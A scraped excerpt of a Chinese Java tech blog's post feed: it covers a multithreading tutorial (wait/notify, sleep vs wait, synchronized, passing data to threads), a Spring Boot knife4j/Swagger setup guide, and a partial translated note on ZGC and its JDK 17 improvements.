在释放 CPU 同时，释放了对象锁的控制。 单单在概念上理解清楚了还不够，需要在实际的例子中进行测试才能更好的理解。对 Object.wait ()，Object.notify () 的应用最经典的例子，应该是三线程打印 ABC 的问题了吧，这是一道比较经典的面试题，题目要求如下： 建立三个线程，A 线程打印 10 次 A，B 线程打印 10 次 B,C 线程打印 10 次 C，要求线程同时运行，交替打印 10 次 ABC。这个问题用 Object 的 wait ()，notify () 就可以很方便的解决。代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225/** * wait用法 * @author DreamSea * @time 2015.3.9 */package com.multithread.wait;public class MyThreadPrinter2 implements Runnable { private String name; private Object prev; private Object self; private MyThreadPrinter2(String name, Object prev, Object self) { this.name = name; this.prev = prev; this.self = self; } @Override public void run() { int count = 10; while (count &gt; 0) { synchronized (prev) { synchronized (self) { System.out.print(name); count--; self.notify(); } try { prev.wait(); } catch (InterruptedException e) { e.printStackTrace(); } } } } public static void main(String[] args) throws Exception { Object a = new Object(); Object b = new Object(); Object c = new Object(); MyThreadPrinter2 pa = new MyThreadPrinter2(&quot;A&quot;, c, a); MyThreadPrinter2 pb = new MyThreadPrinter2(&quot;B&quot;, a, b); MyThreadPrinter2 pc = new MyThreadPrinter2(&quot;C&quot;, b, c); new Thread(pa).start(); Thread.sleep(100); //确保按顺序A、B、C执行 new Thread(pb).start(); Thread.sleep(100); new Thread(pc).start(); Thread.sleep(100); } } 输出结果： ABCABCABCABCABCABCABCABCABCABC 先来解释一下其整体思路，从大的方向上来讲，该问题为三线程间的同步唤醒操作，主要的目的就是 ThreadA-&gt;ThreadB-&gt;ThreadC-&gt;ThreadA 循环执行三个线程。为了控制线程执行的顺序，那么就必须要确定唤醒、等待的顺序，所以每一个线程必须同时持有两个对象锁，才能继续执行。一个对象锁是 prev，就是前一个线程所持有的对象锁。还有一个就是自身对象锁。主要的思想就是，为了控制执行的顺序，必须要先持有 prev 锁，也就前一个线程要释放自身对象锁，再去申请自身对象锁，两者兼备时打印，之后首先调用 self.notify () 释放自身对象锁，唤醒下一个等待线程，再调用 prev.wait () 释放 prev 对象锁，终止当前线程，等待循环结束后再次被唤醒。运行上述代码，可以发现三个线程循环打印 ABC，共 10 次。程序运行的主要过程就是 A 线程最先运行，持有 C,A 对象锁，后释放 A,C 锁，唤醒 B。线程 B 等待 A 锁，再申请 B 锁，后打印 B，再释放 B，A 锁，唤醒 C，线程 C 等待 B 锁，再申请 C 锁，后打印 C，再释放 C,B 锁，唤醒 A。看起来似乎没什么问题，但如果你仔细想一下，就会发现有问题，就是初始条件，三个线程按照 A,B,C 的顺序来启动，按照前面的思考，A 唤醒 B，B 唤醒 C，C 再唤醒 A。但是这种假设依赖于 JVM 中线程调度、执行的顺序。 wait 和 sleep 区别 共同点： \\1. 他们都是在多线程的环境下，都可以在程序的调用处阻塞指定的毫秒数，并返回。 \\2. wait () 和 sleep () 都可以通过 interrupt () 方法 打断线程的暂停状态 ，从而使线程立刻抛出 InterruptedException。 如果线程 A 希望立即结束线程 B，则可以对线程 B 对应的 Thread 实例调用 interrupt 方法。如果此刻线程 B 正在 wait/sleep/join，则线程 B 会立刻抛出 InterruptedException，在 catch () {} 中直接 return 即可安全地结束线程。 需要注意的是，InterruptedException 是线程自己从内部抛出的，并不是 interrupt () 方法抛出的。对某一线程调用 interrupt () 时，如果该线程正在执行普通的代码，那么该线程根本就不会抛出 InterruptedException。但是，一旦该线程进入到 wait ()/sleep ()/join () 后，就会立刻抛出 InterruptedException 。 不同点： \\1. Thread 类的方法：sleep (),yield () 等 Object 的方法：wait () 和 notify () 等 \\2. 每个对象都有一个锁来控制同步访问。Synchronized 关键字可以和对象的锁交互，来实现线程的同步。 sleep 方法没有释放锁，而 wait 方法释放了锁，使得其他线程可以使用同步控制块或者方法。 \\3. wait，notify 和 notifyAll 只能在同步控制方法或者同步控制块里面使用，而 sleep 可以在任何地方使用 所以 sleep () 和 wait () 方法的最大区别是： sleep () 睡眠时，保持对象锁，仍然占有该锁； 而 wait () 睡眠时，释放对象锁。 但是 wait () 和 sleep () 都可以通过 interrupt () 方法打断线程的暂停状态，从而使线程立刻抛出 InterruptedException（但不建议使用该方法）。 sleep（）方法 sleep () 使当前线程进入停滞状态（阻塞当前线程），让出 CUP 的使用、目的是不让当前线程独自霸占该进程所获的 CPU 资源，以留一定时间给其他线程执行的机会； sleep () 是 Thread 类的 Static (静态) 的方法；因此他不能改变对象的机锁，所以当在一个 Synchronized 块中调用 Sleep () 方法是，线程虽然休眠了，但是对象的机锁并木有被释放，其他线程无法访问这个对象（即使睡着也持有对象锁）。 在 sleep () 休眠时间期满后，该线程不一定会立即执行，这是因为其它线程可能正在运行而且没有被调度为放弃执行，除非此线程具有更高的优先级。 wait（）方法 wait () 方法是 Object 类里的方法；当一个线程执行到 wait () 方法时，它就进入到一个和该对象相关的等待池中，同时失去（释放）了对象的机锁（暂时失去机锁，wait (long timeout) 超时时间到后还需要返还对象锁）；其他线程可以访问； wait () 使用 notify 或者 notifyAlll 或者指定睡眠时间来唤醒当前等待池中的线程。 wiat () 必须放在 synchronized block 中，否则会在 program runtime 时扔出”java.lang.IllegalMonitorStateException“异常。 # 七、常见线程名词解释 主线程：JVM 调用程序 main () 所产生的线程。 当前线程：这个是容易混淆的概念。一般指通过 Thread.currentThread () 来获取的进程。 后台线程：指为其他线程提供服务的线程，也称为守护线程。JVM 的垃圾回收线程就是一个后台线程。 用户线程和守护线程的区别在于，是否等待主线程依赖于主线程结束而结束 前台线程：是指接受后台线程服务的线程，其实前台后台线程是联系在一起，就像傀儡和幕后操纵者一样的关系。傀儡是前台线程、幕后操纵者是后台线程。由前台线程创建的线程默认也是前台线程。可以通过 isDaemon () 和 setDaemon () 方法来判断和设置一个线程是否为后台线程。 ** 线程类的一些常用方法： sleep (): 强迫一个线程睡眠Ｎ毫秒。 isAlive (): 判断一个线程是否存活。 join (): 等待线程终止。 activeCount (): 程序中活跃的线程数。 enumerate (): 枚举程序中的线程。 currentThread (): 得到当前线程。 isDaemon (): 一个线程是否为守护线程。 setDaemon (): 设置一个线程为守护线程。(用户线程和守护线程的区别在于，是否等待主线程依赖于主线程结束而结束) setName (): 为线程设置一个名称。 wait (): 强迫一个线程等待。 notify (): 通知一个线程继续运行。 setPriority (): 设置一个线程的优先级。 ** # 八、线程同步 1、synchronized 关键字的作用域有二种： 1）是某个对象实例内，synchronized aMethod (){} 可以防止多个线程同时访问这个对象的 synchronized 方法（如果一个对象有多个 synchronized 方法，只要一个线程访问了其中的一个 synchronized 方法，其它线程不能同时访问这个对象中任何一个 synchronized 方法）。这时，不同的对象实例的 synchronized 方法是不相干扰的。也就是说，其它线程照样可以同时访问相同类的另一个对象实例中的 synchronized 方法； 2）是某个类的范围，synchronized static aStaticMethod {} 防止多个线程同时访问这个类中的 synchronized static 方法。它可以对类的所有对象实例起作用。 2、除了方法前用 synchronized 关键字，synchronized 关键字还可以用于方法中的某个区块中，表示只对这个区块的资源实行互斥访问。用法是: synchronized (this){/ 区块 /}，它的作用域是当前对象； 3、synchronized 关键字是不能继承的，也就是说，基类的方法 synchronized f (){} 在继承类中并不自动是 synchronized f (){}，而是变成了 f (){}。继承类需要你显式的指定它的某个方法为 synchronized 方法； Java 对多线程的支持与同步机制深受大家的喜爱，似乎看起来使用了 synchronized 关键字就可以轻松地解决多线程共享数据同步问题。到底如何？――还得对 synchronized 关键字的作用进行深入了解才可定论。 总的说来，synchronized 关键字可以作为函数的修饰符，也可作为函数内的语句，也就是平时说的同步方法和同步语句块。如果再细的分类，synchronized 可作用于 instance 变量、object reference（对象引用）、static 函数和 class literals (类名称字面常量) 身上。 在进一步阐述之前，我们需要明确几点： A．无论 synchronized 关键字加在方法上还是对象上，它取得的锁都是对象，而不是把一段代码或函数当作锁――而且同步方法很可能还会被其他线程的对象访问。 B．每个对象只有一个锁（lock）与之相关联。 C．实现同步是要很大的系统开销作为代价的，甚至可能造成死锁，所以尽量避免无谓的同步控制。 接着来讨论 synchronized 用到不同地方对代码产生的影响： 假设 P1、P2 是同一个类的不同对象，这个类中定义了以下几种情况的同步块或同步方法，P1、P2 就都可以调用它们。 1． 把 synchronized 当作函数修饰符时，示例代码如下： 12345678910111213Public synchronized void methodAAA(){//….} 这也就是同步方法，那这时 synchronized 锁定的是哪个对象呢？它锁定的是调用这个同步方法对象。也就是说，当一个对象 P1 在不同的线程中执行这个同步方法时，它们之间会形成互斥，达到同步的效果。但是这个对象所属的 Class 所产生的另一对象 P2 却可以任意调用这个被加了 synchronized 关键字的方法。 上边的示例代码等同于如下代码： 12345678910111213141516171819202122232425public void methodAAA(){synchronized (this) // (1){ //…..}} (1) 处的 this 指的是什么呢？它指的就是调用这个方法的对象，如 P1。可见同步方法实质是将 synchronized 作用于 object reference。――那个拿到了 P1 对象锁的线程，才可以调用 P1 的同步方法，而对 P2 而言，P1 这个锁与它毫不相干，程序也可能在这种情形下摆脱同步机制的控制，造成数据混乱：（ 2．同步块，示例代码如下： 12345678910111213141516171819202122232425 public void method3(SomeObject so) { synchronized(so){ //…..}} 这时，锁就是 so 这个对象，谁拿到这个锁谁就可以运行它所控制的那段代码。当有一个明确的对象作为锁时，就可以这样写程序，但当没有明确的对象作为锁，只是想让一段代码同步时，可以创建一个特殊的 instance 变量（它得是一个对象）来充当锁： 123456789101112131415161718192021222324252627282930313233class Foo implements Runnable{ private byte[] lock = new byte[0]; // 特殊的instance变量 Public void methodA(){ synchronized(lock) { //… }}//…..} 注：零长度的 byte 数组对象创建起来将比任何对象都经济――查看编译后的字节码：生成零长度的 byte [] 对象只需 3 条操作码，而 Object lock = new Object () 则需要 7 行操作码。 3．将 synchronized 作用于 static 函数，示例代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041Class Foo{public synchronized static void methodAAA() // 同步的static 函数{//….}public void methodBBB(){ synchronized(Foo.class) // class literal(类名称字面常量)} } 代码中的 methodBBB () 方法是把 class literal 作为锁的情况，它和同步的 static 函数产生的效果是一样的，取得的锁很特别，是当前调用这个方法的对象所属的类（Class，而不再是由这个 Class 产生的某个具体对象了）。 记得在《Effective Java》一书中看到过将 Foo.class 和 P1.getClass () 用于作同步锁还不一样，不能用 P1.getClass () 来达到锁这个 Class 的目的。P1 指的是由 Foo 类产生的对象。 可以推断：如果一个类中定义了一个 synchronized 的 static 函数 A，也定义了一个 synchronized 的 instance 函数 B，那么这个类的同一对象 Obj 在多线程中分别访问 A 和 B 两个方法时，不会构成同步，因为它们的锁都不一样。A 方法的锁是 Obj 这个对象，而 B 的锁是 Obj 所属的那个 Class。 总结一下： 1、线程同步的目的是为了保护多个线程反问一个资源时对资源的破坏。 2、线程同步方法是通过锁来实现，每个对象都有切仅有一个锁，这个锁与一个特定的对象关联，线程一旦获取了对象锁，其他访问该对象的线程就无法再访问该对象的其他非同步方法 3、对于静态同步方法，锁是针对这个类的，锁对象是该类的 Class 对象。静态和非静态方法的锁互不干预。一个线程获得锁，当在一个同步方法中访问另外对象上的同步方法时，会获取这两个对象锁。 4、对于同步，要时刻清醒在哪个对象上同步，这是关键。 5、编写线程安全的类，需要时刻注意对多个线程竞争访问资源的逻辑和安全做出正确的判断，对 “原子” 操作做出分析，并保证原子操作期间别的线程无法访问竞争资源。 6、当多个线程等待一个对象锁时，没有获取到锁的线程将发生阻塞。 7、死锁是线程间相互等待锁锁造成的，在实际中发生的概率非常的小。真让你写个死锁程序，不一定好使，呵呵。但是，一旦程序发生死锁，程序将死掉。 # 九、线程数据传递 在传统的同步开发模式下，当我们调用一个函数时，通过这个函数的参数将数据传入，并通过这个函数的返回值来返回最终的计算结果。但在多线程的异步开发模式下，数据的传递和返回和同步开发模式有很大的区别。由于线程的运行和结束是不可预料的，因此，在传递和返回数据时就无法象函数一样通过函数参数和 return 语句来返回数据。 9.1、通过构造方法传递数据 在创建线程时，必须要建立一个 Thread 类的或其子类的实例。因此，我们不难想到在调用 start 方法之前通过线程类的构造方法将数据传入线程。并将传入的数据使用类变量保存起来，以便线程使用 (其实就是在 run 方法中使用)。下面的代码演示了如何通过构造方法来传递数据： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package mythread; public class MyThread1 extends Thread { private String name; public MyThread1(String name) { this.name = name; } public void run() { System.out.println(&quot;hello &quot; + name); } public static void main(String[] args) { Thread thread = new MyThread1(&quot;world&quot;); thread.start(); } } 由于这种方法是在创建线程对象的同时传递数据的，因此，在线程运行之前这些数据就就已经到位了，这样就不会造成数据在线程运行后才传入的现象。如果要传递更复杂的数据，可以使用集合、类等数据结构。使用构造方法来传递数据虽然比较安全，但如果要传递的数据比较多时，就会造成很多不便。由于 Java 没有默认参数，要想实现类似默认参数的效果，就得使用重载，这样不但使构造方法本身过于复杂，又会使构造方法在数量上大增。因此，要想避免这种情况，就得通过类方法或类变量来传递数据。 9.2、通过变量和方法传递数据 向对象中传入数据一般有两次机会，第一次机会是在建立对象时通过构造方法将数据传入，另外一次机会就是在类中定义一系列的 public 的方法或变量（也可称之为字段）。然后在建立完对象后，通过对象实例逐个赋值。下面的代码是对 MyThread1 类的改版，使用了一个 setName 方法来设置 name 变量： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package mythread; public class MyThread2 implements Runnable { private String name; public void setName(String name) { this.name = name; } public void run() { System.out.println(&quot;hello &quot; + name); } public static void main(String[] args) { MyThread2 myThread = new MyThread2(); myThread.setName(&quot;world&quot;); Thread thread = new Thread(myThread); thread.start(); } } 9.3、通过回调函数传递数据 上面讨论的两种向线程中传递数据的方法是最常用的。但这两种方法都是 main 方法中主动将数据传入线程类的。这对于线程来说，是被动接收这些数据的。然而，在有些应用中需要在线程运行的过程中动态地获取数据，如在下面代码的 run 方法中产生了 3 个随机数，然后通过 Work 类的 process 方法求这三个随机数的和，并通过 Data 类的 value 将结果返回。从这个例子可以看出，在返回 value 之前，必须要得到三个随机数。也就是说，这个 value 是无法事先就传入线程类的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153package mythread; class Data { public int value = 0; } class Work { public void process(Data data, Integer numbers) { for (int n : numbers) { data.value += n; } } } public class MyThread3 extends Thread { private Work work; public MyThread3(Work work) { this.work = work; } public void run() { java.util.Random random = new java.util.Random(); Data data = new Data(); int n1 = random.nextInt(1000); int n2 = random.nextInt(2000); int n3 = random.nextInt(3000); work.process(data, n1, n2, n3); // 使用回调函数 System.out.println(String.valueOf(n1) + &quot;+&quot; + String.valueOf(n2) + &quot;+&quot; + String.valueOf(n3) + &quot;=&quot; + data.value); } public static void main(String[] args) { Thread thread = new MyThread3(new Work()); thread.start(); } } 好了，Java 多线程的基础知识就讲到这里了，有兴趣研究多线程的推荐直接看 java 的源码，你将会得到很大的提升！ # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/06/14/%E3%80%90Java%E3%80%91Java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0(%E5%90%90%E8%A1%80%E8%B6%85%E8%AF%A6%E7%BB%86%E6%80%BB%E7%BB%93)/"},{"title":"SpringBoot整合knife4j框架(可生成离线接口文档)，并设置接口请求头token默认值","text":"# SpringBoot 整合 knife4j 框架 (可生成离线接口文档)，并设置接口请求头 token 默认值 功能和 swagger 类似 官网地址：https://doc.xiaominfo.com/knife4j/ 引入依赖 12345&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.7&lt;/version&gt;&lt;/dependency&gt; Knife4jConfig .java 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.core.env.Environment;import org.springframework.core.env.Profiles;import springfox.documentation.builders.ParameterBuilder;import springfox.documentation.builders.RequestHandlerSelectors;import springfox.documentation.schema.ModelRef;import springfox.documentation.service.ApiInfo;import springfox.documentation.service.Contact;import springfox.documentation.service.Parameter;import springfox.documentation.spi.DocumentationType;import springfox.documentation.spring.web.plugins.Docket;import springfox.documentation.swagger2.annotations.EnableSwagger2; import java.util.ArrayList;import java.util.List; /** * @author yvioo。 */@Configuration@EnableSwagger2 //开启Swagger2public class Knife4jConfig { /** * 配置Swagger的Docket的bean实例 * @return */ @Bean public Docket docket(Environment environment) { //设置只在开发中环境中启动swagger Profiles profiles=Profiles.of(&quot;dev&quot;); //表示如果现在是dev环境，则返回true 开启swagger boolean flag=environment.acceptsProfiles(profiles); /*添加接口请求头参数配置 没有的话 可以忽略*/ ParameterBuilder tokenPar = new ParameterBuilder(); List&lt;Parameter&gt; pars = new ArrayList&lt;&gt;(); tokenPar.name(&quot;token&quot;).description(&quot;令牌&quot;).defaultValue(&quot;设置token默认值&quot;).modelRef(new ModelRef(&quot;string&quot;)).parameterType(&quot;header&quot;).required(false).build(); pars.add(tokenPar.build()); return new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo()) //是否启动swagger 默认启动 .enable(flag) //所在分组 .groupName(&quot;yvioo&quot;) .select() //指定扫描的包路径 .apis(RequestHandlerSelectors.basePackage(&quot;com.example.demo.controller&quot;)) //指定扫描的请求，这里表示扫描 /hello/ 的请求 //.paths(PathSelectors.ant(&quot;/hello/**&quot;)) .build() .globalOperationParameters(pars); } /** * 配置ApiInfo信息 * @return */ private ApiInfo apiInfo() { //作者信息 Contact author = new Contact(&quot;yvioo&quot;, &quot;https://www.cnblogs.com/pxblog/&quot;, &quot;111@qq.com&quot;); return new ApiInfo( &quot;Knife4j测试&quot;, &quot;Knife4j描述&quot;, &quot;1.0&quot;, &quot;urn:tos&quot;, author, &quot;Apache 2.0&quot;, &quot;http://www.apache.org/licenses/LICENSE-2.0&quot;, new ArrayList() ); }} 控制器的写法和 swagger 基本类似 123456789@Api(tags = &quot;首页模块&quot;)@RestControllerpublic class IndexController { @ApiImplicitParam(name = &quot;name&quot;,value = &quot;姓名&quot;,required = true) @ApiOperation(value = &quot;向客人问好&quot;) @GetMapping(&quot;/sayHi&quot;) public ResponseEntity&lt;String&gt; sayHi(@RequestParam(value = &quot;name&quot;)String name){ return ResponseEntity.ok(&quot;Hi:&quot;+name); }} 但是如果有其他配置继承了 WebMvcConfigurationSupport 就需要增加资源映射 不然会失效 12345678910111213141516@Configurationpublic class WebMvcConfigurer extends WebMvcConfigurationSupport { /** * 发现如果继承了WebMvcConfigurationSupport， 需要重新指定静态资源 * */ @Override public void addResourceHandlers(ResourceHandlerRegistry registry) { registry.addResourceHandler(&quot;/**&quot;).addResourceLocations( &quot;classpath:/static/&quot;); registry.addResourceHandler(&quot;doc.html&quot;).addResourceLocations( &quot;classpath:/META-INF/resources/&quot;); registry.addResourceHandler(&quot;/webjars/**&quot;).addResourceLocations( &quot;classpath:/META-INF/resources/webjars/&quot;); super.addResourceHandlers(registry); }} 效果 离线接口文档 浏览器访问 使用 dev 环境 启动项目后 浏览器打开 http://localhost:8081/doc.html#/ 我这里用的端口是 8081 整合 swagger 框架参考：https://www.cnblogs.com/pxblog/p/12942825.html # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/01/07/%E3%80%90Java%E3%80%91SpringBoot%E6%95%B4%E5%90%88knife4j%E6%A1%86%E6%9E%B6(%E5%8F%AF%E7%94%9F%E6%88%90%E7%A6%BB%E7%BA%BF%E6%8E%A5%E5%8F%A3%E6%96%87%E6%A1%A3)%EF%BC%8C%E5%B9%B6%E8%AE%BE%E7%BD%AE%E6%8E%A5%E5%8F%A3%E8%AF%B7%E6%B1%82%E5%A4%B4token%E9%BB%98%E8%AE%A4%E5%80%BC/"},{"title":"ZGC学习笔记：ZGC简介和JDK17对ZGC的优化","text":"01 ZGC 简介 ZGC 是一个可扩展的低延迟垃圾收集器，能够处理 8MB 到 16TB 大小的堆，最大暂停时间为亚毫秒。 OpenJDK 的官网只写到这里，然后让我们自己去看 Wiki（链接 2）…… 好偷懒…… Wiki的介绍是更详细一些。 Z Garbage Collector，也称为 ZGC，是一种可扩展的低延迟垃圾收集器，旨在满足以下目标： 亚毫秒最大暂停时间 暂停时间不会随着堆、live-set 或 root-set 的大小而增加 处理大小从 8MB 到 16TB 的堆 ZGC 最初是作为 JDK 11 中的一项实验性功能引入的，并在 JDK 15 中被宣布为 Production Ready。 ZGC 的几个特征： 并发 基于区域 基于压缩 NUMA 感知 使用染色指针 使用负载屏障（原文为 load barriers） ZGC 的核心是一个并发垃圾收集器，这意味着所有繁重的工作都在 Java 线程继续执行的同时完成。这极大地减少了垃圾收集对应用程序响应时间的影响。 ZGC 项目由 HotSpot Group 赞助。 下图是截止目前为止（2020-04-17）的 ZGC 的发布时间表，可以看出 ZGC 总 JDK11 开始实验性推出，JDK15 开始正式发布。 ZGC的部分参数： ZGC 部分操作： 使用下述命令选项启用 ZGC -XX:+UseZGC 启用 ZGC 设置堆大小 ZGC 最重要的调优选项是设置最大堆大小（-Xmx&lt;size&gt;）。由于 ZGC 是一个并发收集器，因此必须选择最大堆大小，以便 堆可以容纳应用程序的实时集， 堆中有足够的空间来允许在 GC 时处理处理分配。 需要多少空间取决于应用程序的分配率和 live-set 大小。一般而言，给 ZGC 的内存越多越好。但与此同时，浪费内存是不可取的，所以这一切都是为了在内存使用和 GC 需要运行的频率之间找到一个平衡点。 3. 设置并发 GC 线程数 第二个重要的选项是设置并发 GC 线程的数量 (-XX:ConcGCThreads=&lt;number&gt;)。ZGC 具有自动选择此数字的启发式方法。这种启发式通常效果很好，但根据应用程序的特性，这可能需要进行调整。这个选项本质上决定了应该给 GC 多少 CPU-time（ps：这个不知道咋翻译，就叫CPU时间？先不翻译）。给了ZGC太多运行时间，GC 将从应用程序中占用过多的 CPU-time。给它太少，应用程序分配垃圾的速度可能比 GC 收集它的速度快。 一般来说，如果低延迟（即低应用程序响应时间）是工业环境中的最大痛点，在配置相应操作时候就不需要太吝啬。理想情况下，系统的 CPU 利用率不应超过 70%。 4. 返回未使用内存给操作系统 默认情况下，ZGC 取消提交未使用的内存，将其返回给操作系统。这对于注重内存占用的应用程序和环境很有用。可以使用 -XX:-ZUncommit 禁用此功能。此外，内存不会被取消提交，因此堆大小会缩小到最小堆大小 (-Xms) 以下。这意味着如果最小堆大小 (-Xms) 配置为等于最大堆大小 (-Xmx)，则此功能将被隐式禁用。 可以使用 -XX:ZUncommitDelay=&lt;seconds&gt; 配置取消提交延迟（默认为 300 秒）。此延迟指定内存在有资格取消提交之前应该未使用多长时间。 注意事项：在 Linux 上，取消提交未使用的内存需要具有 FALLOC_FL_PUNCH_HOLE 支持的 fallocate(2)，此特性首先出现在内核版本 3.5（用于 tmpfs）和 4.3（用于 hugetlbfs）中。 5. 启用 Linux 的大页（large page）操作 将 ZGC 配置为使用大页面通常会产生更好的性能（在吞吐量、延迟和启动时间方面）并且没有真正的缺点，只是设置起来稍微复杂一些。设置过程通常需要 root 权限，这就是默认情况下不启用它的原因。 在 Linux/x86 上，大页面（英文原文为large page和huge page）的大小为 2MB。 假设您需要一个 16G Java 堆。这意味着您需要 16G / 2M = 8192 个大页面。 首先为大页面池分配至少 16G（8192 页）的内存。“至少”部分很重要，因为在 JVM 中启用大页面意味着不仅 GC 会尝试将这些用于 Java 堆，而且 JVM 的其他部分也会尝试将它们用于各种 内部数据结构（代码堆、标记位图等）。因此，在本例中，我们将保留 9216 个页面 (18G) 以允许 2G 的非 Java 堆分配来使用大页面。 6. 启用 Linux 的透明大页（transparent large page）操作 使用显式大页面（explicit large pages，就是5小节的大页面）的替代方法是使用透明大页面（ transparent huge pages）。通常不建议对延迟敏感的应用程序使用透明大页面（ latency sensitive，因为它往往会导致不必要的延迟峰值。但是，可能值得尝试看看系统的工作负载是否/如何受到它的影响。 注意事项：在 Linux 上，使用启用透明大页的 ZGC 需要kernel &gt;= 4.7。 7. 启用 NUMA 支持 ZGC 支持 NUMA，这意味着它会尽量将 Java 堆分配指向 NUMA 本地内存。默认情况下启用此功能。但是，如果 JVM 检测到它只能使用单个 NUMA 节点上的内存，它将自动被禁用。通常，无需担心此设置，但如果您想显式覆盖 JVM 的决定，可以使用 -XX:+UseNUMA 或 -XX:-UseNUMA 选项来实现。 在 NUMA 机器（例如多插槽 x86 机器）上运行时，启用 NUMA 支持通常会显著提升性能。 注: 关于NUMA,即Non Uniform Memory Access，非统一内存管理技术。以下直接截图于百度百科： 8. 启用 GC 日志 打个日志而已，就截图了。 具体操作还是参考链接 2。 02 ZGC 在 JDK17 中的最新优化 翻译自链接 4。 JDK 17 于2021年 9 月 14 日发布。这是一个长期支持 (LTS) 版本，这意味着它将得到多年的支持和更新。这也是第一个包含 ZGC 生产就绪版本（production ready version）的 LTS 版本。 稍微回忆一下，JDK 11（以前的 LTS 版本）中包含了 ZGC 的实验版本，而 ZGC 的第一个生产就绪版本出现在 JDK 15（非 LTS 版本）中。 因此，可以说JDK17是第一个开始推出成熟的ZGC的长期支持的ZGC版本。 （本来还想把JDK15，JDK16啥的ZGC的翻译一下，不过既然JDK17中ZGC这么重要，就只搬运JDK17的优化好了。） 1. 动态 GC 线程数 长期以来，JVM 都有一个名为 -XX:+UseDynamicNumberOfGCThreads 的选项。它默认启用，并告诉 GC 智能地了解它用于各种操作的 GC 线程数。使用的线程数将不断重新评估，因此会随着时间而变化。这个选项很有用有几个原因。例如，很难确定给定工作负载的最佳 GC 线程数是多少。通常发生的情况是，运维人员尝试各种设置 -XX:ParallelGCThreads 和 / 或 -XX:ConcGCThreads （取决于使用的 GC），看看哪个似乎给出了最好的结果。更复杂的是，最佳 GC 线程数可能会随着应用程序经历不同阶段而随时间变化，因此设置固定数量的 GC 线程本质上可能不是最佳的。 在 JDK 17 之前，ZGC 忽略 -XX:+UseDynamicNumberOfGCThreads 并始终使用固定数量的线程。在 JVM 启动期间，ZGC 使用启发式方法来决定该固定数字 (-XX:ConcGCThreads) 应该是什么。一旦设定了这个数字，它就再也不会改变了。从 JDK 17 开始，ZGC 现在支持 -XX:+UseDynamicNumberOfGCThreads 并尝试使用尽可能少、但是足够多的线程来保持以创建的速度收集垃圾。这有助于避免使用比需要更多的 CPU 时间，从而使 Java 线程可以使用更多的 CPU 时间。 另请注意，启用此功能后，-XX:ConcGCThreads 的含义从“使用这么多线程”变为“最多使用这么多线程”。除非有一个非常规的工作负载，否则你通常不需要摆弄 -XX:ConcGCThreads。ZGC 的启发式算法会根据运行的系统的大小为机器选择合适的最大线程数。 （注：就是说JDK17开始，ZGC的运行时线程数是动态的，-XX:ConcGCThreads 设置的是最大可用线程，但是如果更少的线程就能满足需求，ZGC就会使用更少的线程；如果运行中需要增加线程数，ZGC也会动态增加线程数） 为了说明此功能的实际作用，官方贴出了一下运行 SPECjbb2015 时的一些图表。 第一张图显示了整个运行过程中使用的 GC 线程数。SPECjbb2015 有一个初始加速阶段，随后是一个较长的阶段，其中负载（注入速率）逐渐增加。我们可以看到 ZGC 使用的线程数反映了它需要做的工作量来跟上。只有在少数情况下，它需要所有（在本例中为 5 个）线程。 JDK16和JDK17的打分比较图如下。 如果出于某种原因希望始终使用固定数量的 GC 线程（如在 JDK 16 和更早版本中），则可以使用 -XX:-UseDynamicNumberOfGCThreads 禁用此功能（注：应该没人会用吧？）。 2. 快速 JVM 终止 在之前使用版本的Java程序中，如果使用的垃圾回收器是 ZGC ，终止正在运行的 Java 进程（例如，通过按 Ctrl+C 或通过让应用程序调用 System.exit()）， JVM 有时可能需要一段时间（在最坏的情况下为数秒）才能真正终止。这在一些需要快速宕机的场景下很烦人，如果某个场景需要快速终止程序，JVM的慢停止会导致一定问题。。 那么，为什么之前在使用 ZGC 时，JVM 有时会需要一些时间来终止呢？原因是 JVM 的关闭顺序需要与 GC 协调，让 GC 停止正在做的事情，进入“安全”状态。ZGC 仅在空闲时处于“安全”状态，即当前不收集垃圾。如果终止信号到达时正在进行一个非常长的 GC 周期，那么 JVM 关闭序列只需等待该 GC 周期完成，然后 ZGC 变为空闲并再次进入“安全”状态。 这已在 JDK 17 中得到解决。ZGC 现在能够中止正在进行的 GC 循环，以按需快速达到“安全”状态。终止运行 ZGC 的 JVM 现在或多或少是即时的。 3. 减少标记堆栈内存使用 ZGC做条纹标记。这是指将堆划分为条带，并分配每个 GC 线程来标记其中一个条带（strip）中的对象。这有助于最小化 GC 线程之间的共享状态，并使标记过程对缓存更加友好，因为两个 GC 线程不会在堆的同一部分标记对象。这种方法还可以在 GC 线程之间实现自然的工作平衡，因为一个条带（strip）中的工作量往往大致相同。 下图是ZGC的基于多线程垃圾回收器对基于条带的Java堆内存的回收机制示意图。 在 JDK 17 之前，ZGC 的标记严格遵守条带化。如果一个 GC 线程在跟踪对象图时遇到一个对象引用，该对象引用指向不属于其分配的条带的堆的一部分，则该对象引用被放置在与该其他对象关联的线程本地标记堆栈上条纹。一旦该堆栈已满（254 